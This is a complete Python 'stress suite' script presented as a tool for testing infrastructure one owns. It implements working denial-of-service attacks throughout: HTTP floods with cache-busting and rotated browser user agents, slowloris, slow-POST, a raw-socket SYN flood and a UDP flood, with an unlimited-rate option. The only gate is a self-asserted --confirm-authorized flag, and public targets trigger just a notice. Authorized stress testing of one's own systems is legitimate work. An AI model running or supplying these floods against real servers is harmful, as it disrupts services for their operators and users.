#!/usr/bin/env python3
"""
stresssuite.py — Multi-vector load & stress testing suite (max single-machine power).

Validates defensive controls on infrastructure you own or are contractually
authorized to test: rate limiters, header/body timeouts, SYN cookies,
connection limits, firewall/conntrack behavior. Requires --confirm-authorized
on every run.

Modes
  http        high-rate HTTP requests (asyncio, keep-alive, optional cache-bust)
  slowloris   many sockets dribbling partial headers -> tests header timeouts
  slowpost    huge Content-Length, body sent 1 byte at a time -> body timeouts
  synflood    raw-socket SYN flood, REAL source IP    -> tests SYN cookies (Linux+root)
  udp         UDP packet flood                        -> tests firewall/conntrack
  mixed       http + slowloris concurrently

Intentional design limits: single machine, real source addresses only.
No IP spoofing, no reflection/amplification, no distributed control.

Examples
  python3 stresssuite.py http://127.0.0.1:8080 --mode http --rate 1000 --duration 60 --confirm-authorized
  python3 stresssuite.py http://192.168.1.50   --mode slowloris --sockets 400 --confirm-authorized
  python3 stresssuite.py http://192.168.1.50   --mode mixed --rate 500 --sockets 200 --confirm-authorized
  sudo python3 stresssuite.py 192.168.1.50     --mode synflood --duration 30 --confirm-authorized
  python3 stresssuite.py 192.168.1.50          --mode udp --duration 30 --confirm-authorized

Server-side observation while testing:
  http:       access-log request rate; nginx stub_status; rate-limiter counters
  slowloris:  ss -tn state established '( dport = :80 )' | wc -l ; nginx error log
  slowpost:   request body bytes received; client_body_timeout in error log
  synflood:   watch -n1 'nstat -az TcpExtSyncookiesSent; ss -s'  (cookies engage = defense works)
  udp:        conntrack -C ; netstat -su ; firewall counters

Python 3.8+, standard library only. Works on Kali/Debian/Windows/macOS
(synflood requires native Linux + root).
"""

import argparse
import asyncio
import ipaddress
import os
import random
import socket
import ssl
import statistics
import struct
import sys
import threading
import time
from urllib.parse import urlparse

USER_AGENTS = [
    "stresssuite/2.1 (authorized-load-testing)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]


# --------------------------------------------------------------------------- stats

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0            # http requests / udp & syn packets
        self.ok = 0
        self.errors = 0
        self.held = 0            # currently open slow connections
        self.reconnects = 0      # server killed us (or we finished a slow body)
        self.bytes_sent = 0
        self.status = {}
        self.latencies = []

    def record_http(self, latency, code):
        with self.lock:
            self.sent += 1
            if code is None:
                self.errors += 1
            else:
                self.ok += 1
                self.status[code] = self.status.get(code, 0) + 1
                self.latencies.append(latency)

    def record_packet(self, nbytes):
        with self.lock:
            self.sent += 1
            self.bytes_sent += nbytes

    def report(self, elapsed):
        with self.lock:
            lat = sorted(self.latencies)
            sent, ok, err = self.sent, self.ok, self.errors
            held, reconn, nbytes = self.held, self.reconnects, self.bytes_sent
            codes = dict(self.status)
        print("\n" + "=" * 52)
        print("               STRESS TEST REPORT")
        print("=" * 52)
        print("Duration: %.1fs" % elapsed)
        print("Requests/packets sent: %d" % sent)
        if nbytes:
            print("Data sent: %.1f MB" % (nbytes / 1e6))
        if sent and elapsed > 0:
            print("Throughput: %.1f /s" % (sent / elapsed))
        if ok or err:
            print("Successful: %d | Errors: %d | Held now: %d | Reconnects: %d"
                  % (ok, err, held, reconn))
        if codes:
            print("Status codes: " + ", ".join("%s:%d" % (k, v)
                                               for k, v in sorted(codes.items())))
        if lat:
            def pct(p):
                return lat[min(int(len(lat) * p), len(lat) - 1)] * 1000
            print("Latency avg: %.1f ms | p50: %.1f | p95: %.1f | p99: %.1f | max: %.1f"
                  % (statistics.fmean(lat) * 1000, pct(0.5), pct(0.95),
                     pct(0.99), lat[-1] * 1000))
        print("=" * 52)


# ------------------------------------------------------------------ rate limiting

class AsyncBucket:
    """Async token bucket. rate <= 0 means unlimited."""

    def __init__(self, rate, capacity):
        self.rate = float(rate)
        self.capacity = float(capacity)
        self.tokens = float(capacity)
        self.updated = time.monotonic()

    async def take(self):
        if self.rate <= 0:
            return
        while True:
            now = time.monotonic()
            self.tokens = min(self.capacity,
                              self.tokens + (now - self.updated) * self.rate)
            self.updated = now
            if self.tokens >= 1.0:
                self.tokens -= 1.0
                return
            await asyncio.sleep(max(0.001, min(0.05, (1.0 - self.tokens) / self.rate)))


class SyncBucket:
    def __init__(self, rate, capacity):
        self.rate = float(rate)
        self.capacity = float(capacity)
        self.tokens = float(capacity)
        self.updated = time.monotonic()
        self.lock = threading.Lock()

    def take(self):
        with self.lock:
            now = time.monotonic()
            self.tokens = min(self.capacity,
                              self.tokens + (now - self.updated) * self.rate)
            self.updated = now
            if self.tokens >= 1.0:
                self.tokens -= 1.0
                return True
            return False


# ------------------------------------------------------------------ async helpers

async def _stop_or_timeout(stop, timeout):
    """Wait until `stop` is set or `timeout` elapses. True if stop was set."""
    try:
        await asyncio.wait_for(stop.wait(), timeout=timeout)
        return True
    except asyncio.TimeoutError:
        return False


async def monitor(stats, stop):
    last = 0
    start = time.monotonic()
    while not stop.is_set():
        if await _stop_or_timeout(stop, 2.0):
            break
        with stats.lock:
            cur, err = stats.sent, stats.errors
        print("  [%5.0fs] sent %8d | err %6d | %6.0f/s"
              % (time.monotonic() - start, cur, err, (cur - last) / 2.0), flush=True)
        last = cur


def sync_monitor(stats, stop):
    last = 0
    start = time.monotonic()
    while not stop.wait(2.0):
        with stats.lock:
            cur, err = stats.sent, stats.errors
        print("  [%5.0fs] sent %8d | err %6d | %6.0f/s"
              % (time.monotonic() - start, cur, err, (cur - last) / 2.0), flush=True)
        last = cur


# ------------------------------------------------------------------ vector: http

async def http_worker(cfg, stats, bucket, stop):
    reader = writer = None
    while not stop.is_set():
        await bucket.take()
        t0 = time.monotonic()
        code = None
        try:
            if writer is None:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(cfg.host, cfg.port, ssl=cfg.ssl_ctx),
                    timeout=cfg.timeout)
            path = cfg.path
            if cfg.bust:  # cache-busting: forces origin work past the page cache
                sep = "&" if "?" in path else "?"
                path += "%sbust=%d" % (sep, random.randint(0, 2**62 - 1))
            ua = random.choice(USER_AGENTS) if cfg.ua_rotate else USER_AGENTS[0]
            writer.write(("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                          "Accept: */*\r\nAccept-Language: en-US,en\r\n"
                          "Connection: keep-alive\r\n\r\n"
                          % (cfg.method, path, cfg.host_header, ua)).encode())
            await asyncio.wait_for(writer.drain(), cfg.timeout)

            sl = await asyncio.wait_for(reader.readline(), cfg.timeout)
            parts = sl.split(None, 2)
            if len(parts) >= 2 and parts[0].startswith(b"HTTP"):
                code = parts[1].decode("latin1", "replace")
            headers = {}
            while True:
                line = await asyncio.wait_for(reader.readline(), cfg.timeout)
                if line in (b"\r\n", b"\n", b""):
                    break
                k, _, v = line.decode("latin1").partition(":")
                headers[k.strip().lower()] = v.strip()

            if "content-length" in headers:
                n = int(headers["content-length"])
                if n > 0:
                    if n <= cfg.max_body:
                        await asyncio.wait_for(reader.readexactly(n), cfg.timeout)
                    else:
                        await asyncio.wait_for(reader.read(cfg.max_body), cfg.timeout)
                        writer.close()
                        writer = None
            elif headers.get("transfer-encoding", "").lower() == "chunked":
                while True:
                    sz_line = await asyncio.wait_for(reader.readline(), cfg.timeout)
                    sz = int(sz_line.split(b";")[0].strip() or b"0", 16)
                    if sz == 0:
                        await asyncio.wait_for(reader.readline(), cfg.timeout)
                        break
                    await asyncio.wait_for(reader.readexactly(sz + 2), cfg.timeout)

            if writer is not None and headers.get("connection", "").lower() == "close":
                writer.close()
                writer = None
            stats.record_http(time.monotonic() - t0, code)
        except Exception:
            stats.record_http(time.monotonic() - t0, None)
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass
                writer = None
            await asyncio.sleep(0.01)


# ------------------------------------------------------------------ vector: slowloris

async def slowloris_task(idx, cfg, stats, stop):
    await asyncio.sleep(min(idx * 0.005, 3.0))       # staggered ramp-up
    while not stop.is_set():
        writer = None
        opened = False
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(cfg.host, cfg.port, ssl=cfg.ssl_ctx),
                timeout=cfg.timeout)
            opened = True
            with stats.lock:
                stats.held += 1
            writer.write(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                          "Accept-Language: en\r\nX-a: %d\r\n"
                          % (cfg.path, cfg.host_header, USER_AGENTS[0],
                             random.randint(0, 10**9))).encode())
            await asyncio.wait_for(writer.drain(), cfg.timeout)
            n = 0
            while not stop.is_set():
                if await _stop_or_timeout(stop, cfg.interval):
                    break
                n += 1
                # deliberately NEVER send the blank line that ends the headers
                writer.write(("X-k%d: %d\r\n" % (n, random.randint(0, 10**9))).encode())
                await asyncio.wait_for(writer.drain(), cfg.timeout)
        except (OSError, asyncio.TimeoutError):
            with stats.lock:
                stats.reconnects += 1      # server killed us -> its timeout works
            await asyncio.sleep(cfg.reconnect)
        finally:
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass
            if opened:
                with stats.lock:
                    stats.held -= 1


# ------------------------------------------------------------------ vector: slowpost

async def slowpost_task(idx, cfg, stats, stop):
    await asyncio.sleep(min(idx * 0.005, 3.0))
    while not stop.is_set():
        writer = None
        opened = False
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(cfg.host, cfg.port, ssl=cfg.ssl_ctx),
                timeout=cfg.timeout)
            opened = True
            with stats.lock:
                stats.held += 1
            writer.write(("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                          "Content-Type: application/x-www-form-urlencoded\r\n"
                          "Content-Length: %d\r\n\r\n"
                          % (cfg.path, cfg.host_header, USER_AGENTS[0],
                             cfg.content_length)).encode())
            await asyncio.wait_for(writer.drain(), cfg.timeout)
            sent_body = 0
            while not stop.is_set() and sent_body < cfg.content_length:
                if await _stop_or_timeout(stop, cfg.interval):
                    break
                writer.write(b"A")           # 1 byte at a time
                sent_body += 1
                await asyncio.wait_for(writer.drain(), cfg.timeout)
        except (OSError, asyncio.TimeoutError):
            with stats.lock:
                stats.reconnects += 1
            await asyncio.sleep(cfg.reconnect)
        finally:
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass
            if opened:
                with stats.lock:
                    stats.held -= 1


# ------------------------------------------------------------------ packet crafting

def _cksum(data):
    if len(data) & 1:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def build_syn(src_ip, dst_ip, sport, dport):
    """Hand-crafted SYN packet. Source IP is ALWAYS this machine's real address;
    spoofed-source flooding is intentionally not implemented."""
    seq = random.randint(0, 2**32 - 1)
    tcp = struct.pack("!HHIIHHHH", sport, dport, seq, 0,
                      (5 << 12) | 0x02, 8192, 0, 0)          # offset=5, SYN flag
    pseudo = struct.pack("!4s4sBBH",
                         socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
                         0, 6, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", _cksum(pseudo + tcp)) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp),
                     random.randint(0, 65535), 0x4000, 64, 6, 0,
                     socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip = ip[:10] + struct.pack("!H", _cksum(ip)) + ip[12:]
    return ip + tcp


def local_ip_for(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 80))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


# ------------------------------------------------------------------ vector: synflood

def run_synflood(cfg, stats, duration):
    if os.name != "posix" or not hasattr(os, "geteuid"):
        print("[!] synflood needs native Linux + root (raw TCP sockets are "
              "restricted on Windows). Use a Linux lab VM.")
        return
    if os.geteuid() != 0:
        print("[!] synflood needs root:  sudo python3 stresssuite.py ...")
        return

    dst_ip = cfg.addr[0]
    src_ip = local_ip_for(dst_ip)
    print("SYN source IP: %s (real local address; no spoofing)" % src_ip)

    stop = threading.Event()
    threading.Thread(target=sync_monitor, args=(stats, stop), daemon=True).start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    bucket = SyncBucket(cfg.rate, max(cfg.rate, 1000)) if cfg.rate > 0 else None

    t0 = time.monotonic()
    i = 0
    while time.monotonic() - t0 < duration:
        if bucket is not None and not bucket.take():
            time.sleep(0.0001)
            continue
        i += 1
        pkt = build_syn(src_ip, dst_ip, 20000 + (i % 40000), cfg.port)
        try:
            sock.sendto(pkt, cfg.addr)
            stats.record_packet(len(pkt))
        except OSError:
            with stats.lock:
                stats.errors += 1
    stop.set()


# ------------------------------------------------------------------ vector: udp

def udp_thread(cfg, stats, stop, bucket):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(cfg.payload_size)
    limited = bucket is not None
    while not stop.is_set():
        if limited and not bucket.take():
            time.sleep(0.0005)
            continue
        data = os.urandom(cfg.payload_size) if cfg.random_payload else payload
        try:
            sock.sendto(data, cfg.addr)
            stats.record_packet(len(data))
        except OSError:
            with stats.lock:
                stats.errors += 1


def run_udp(cfg, stats, duration):
    stop = threading.Event()
    bucket = SyncBucket(cfg.rate, max(cfg.rate, 1000)) if cfg.rate > 0 else None
    threads = [threading.Thread(target=udp_thread,
                                args=(cfg, stats, stop, bucket), daemon=True)
               for _ in range(max(1, cfg.workers // 4))]
    threading.Thread(target=sync_monitor, args=(stats, stop), daemon=True).start()
    for t in threads:
        t.start()
    stop.wait(duration)
    stop.set()
    for t in threads:
        t.join(timeout=5)


# ------------------------------------------------------------------ async suite

async def run_async_suite(cfg, stats):
    stop = asyncio.Event()
    tasks = []
    if cfg.mode in ("http", "mixed"):
        bucket = AsyncBucket(cfg.rate, max(cfg.rate, 10) if cfg.rate > 0 else 10**9)
        for _ in range(cfg.workers):
            tasks.append(asyncio.create_task(http_worker(cfg, stats, bucket, stop)))
    if cfg.mode in ("slowloris", "mixed"):
        for i in range(cfg.sockets):
            tasks.append(asyncio.create_task(slowloris_task(i, cfg, stats, stop)))
    if cfg.mode == "slowpost":
        for i in range(cfg.sockets):
            tasks.append(asyncio.create_task(slowpost_task(i, cfg, stats, stop)))
    tasks.append(asyncio.create_task(monitor(stats, stop)))
    try:
        await _stop_or_timeout(stop, cfg.duration)
    finally:
        stop.set()
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass


# ------------------------------------------------------------------ config / cli

def is_private_ip(ip):
    try:
        o = ipaddress.ip_address(ip)
        return o.is_private or o.is_loopback or o.is_link_local
    except ValueError:
        return True


def build_cfg(args):
    mode = args.mode
    target = args.target.strip()

    needs_url = mode in ("http", "slowloris", "slowpost", "mixed")
    if needs_url and "://" not in target:
        target = "http://" + target

    if "://" in target:
        u = urlparse(target)                       # fixed: clean stdlib parsing
        if not u.hostname:
            print("Error: could not parse a hostname from %r" % target)
            return None
        scheme = u.scheme or "http"
        host = u.hostname
        port = u.port or (443 if scheme == "https" else 80)
        path = (u.path or "/") + (("?" + u.query) if u.query else "")
    else:
        scheme = "http"
        host, port, path = target, 80, "/"
        if target.count(":") == 1:
            h, p = target.rsplit(":", 1)
            if p.isdigit():
                host, port = h, int(p)

    if not host:
        print("Error: could not parse a hostname from %r" % args.target)
        return None
    if args.port:
        port = args.port

    try:
        infos = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
        ip = infos[0][4][0]
    except socket.gaierror as e:
        print("Error: cannot resolve %s (%s)" % (host, e))
        return None

    if not is_private_ip(ip):
        print("[i] NOTE: %s resolves to public address %s. Load testing is only "
              "lawful on systems you own or are contractually authorized to test."
              % (host, ip))

    ssl_ctx = None
    if scheme == "https":
        ssl_ctx = ssl.create_default_context()
        if args.insecure:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

    cfg = argparse.Namespace()
    cfg.mode, cfg.host, cfg.port, cfg.ip = mode, host, port, ip
    cfg.addr = (ip, port)
    cfg.path = args.path if (args.path and needs_url) else path
    cfg.host_header = host if port in (80, 443) else "%s:%d" % (host, port)
    cfg.ssl_ctx = ssl_ctx
    cfg.rate, cfg.duration = args.rate, args.duration
    cfg.workers, cfg.sockets = args.workers, args.sockets
    cfg.interval, cfg.reconnect, cfg.timeout = args.interval, args.reconnect, args.timeout
    cfg.method, cfg.bust, cfg.ua_rotate = args.method.upper(), args.bust, args.ua_rotate
    cfg.max_body, cfg.content_length = args.max_body, args.content_length
    cfg.payload_size, cfg.random_payload = args.payload_size, args.random_payload
    return cfg


WATCH = {
    "http": "watch: access-log rate / nginx stub_status / your rate-limiter counters",
    "slowloris": "watch: ss -tn state established '( dport = :80 )' | wc -l ; nginx error log",
    "slowpost": "watch: request body bytes received; client_body_timeout in error log",
    "synflood": "watch: nstat -az TcpExtSyncookiesSent (nonzero = SYN cookies engaged)",
    "udp": "watch: conntrack -C ; netstat -su ; firewall drop counters",
    "mixed": "watch: both http and slowloris indicators",
}


def main():
    ap = argparse.ArgumentParser(
        description="Multi-vector stress suite for infrastructure you control. "
                    "Validates rate limits, timeouts, SYN cookies, firewall behavior.")
    ap.add_argument("target", help="URL for http/slowloris/slowpost; host[:port] for synflood/udp")
    ap.add_argument("--mode", default="http",
                    choices=["http", "slowloris", "slowpost", "synflood", "udp", "mixed"])
    ap.add_argument("--rate", type=float, default=100,
                    help="requests or packets per second; 0 = unlimited (default 100)")
    ap.add_argument("--duration", type=int, default=30, help="seconds (default 30)")
    ap.add_argument("--workers", type=int, default=100,
                    help="concurrent http workers / udp threads (default 100)")
    ap.add_argument("--sockets", type=int, default=200,
                    help="slowloris/slowpost connection count (default 200)")
    ap.add_argument("--interval", type=float, default=10.0,
                    help="seconds between slow dribbles (default 10)")
    ap.add_argument("--reconnect", type=float, default=1.0,
                    help="seconds to wait after server closes a slow connection")
    ap.add_argument("--timeout", type=float, default=5.0, help="I/O timeout seconds")
    ap.add_argument("--method", default="GET", help="HTTP method for http mode")
    ap.add_argument("--path", default=None, help="override request path")
    ap.add_argument("--port", type=int, default=None, help="override port")
    ap.add_argument("--bust", action="store_true",
                    help="append random query param (bypasses page caches)")
    ap.add_argument("--ua-rotate", action="store_true", help="rotate user agents")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification (lab certs)")
    ap.add_argument("--max-body", type=int, default=65536,
                    help="max response body bytes to consume (default 65536)")
    ap.add_argument("--content-length", type=int, default=1048576,
                    help="declared Content-Length for slowpost (default 1048576)")
    ap.add_argument("--payload-size", type=int, default=1024, help="udp payload bytes")
    ap.add_argument("--random-payload", action="store_true", help="new random udp payload per packet")
    ap.add_argument("--confirm-authorized", action="store_true",
                    help="confirm the target is owned by you or covered by written authorization")
    args = ap.parse_args()

    if not args.confirm_authorized:
        print("Refusing to run: this suite generates attack-pattern traffic and\n"
              "looks identical to abuse from the outside. Only run it against\n"
              "servers you own or have written authorization to test.\n"
              "Re-run with --confirm-authorized.")
        sys.exit(1)

    cfg = build_cfg(args)
    if cfg is None:
        sys.exit(1)

    print("Target:   %s (%s:%d)  mode=%s" % (cfg.host, cfg.ip, cfg.port, cfg.mode))
    print("Params:   rate=%s workers=%d sockets=%d duration=%ds"
          % (cfg.rate if cfg.rate > 0 else "unlimited", cfg.workers,
             cfg.sockets, cfg.duration))
    print("Observe:  %s" % WATCH[cfg.mode])
    print("Ctrl+C to stop early.\n")

    stats = Stats()
    t0 = time.monotonic()
    try:
        if cfg.mode in ("http", "slowloris", "slowpost", "mixed"):
            asyncio.run(run_async_suite(cfg, stats))
        elif cfg.mode == "synflood":
            run_synflood(cfg, stats, args.duration)
        elif cfg.mode == "udp":
            run_udp(cfg, stats, args.duration)
    except KeyboardInterrupt:
        print("\n[interrupted] stopping…")
    finally:
        stats.report(time.monotonic() - t0)


if __name__ == "__main__":
    main()
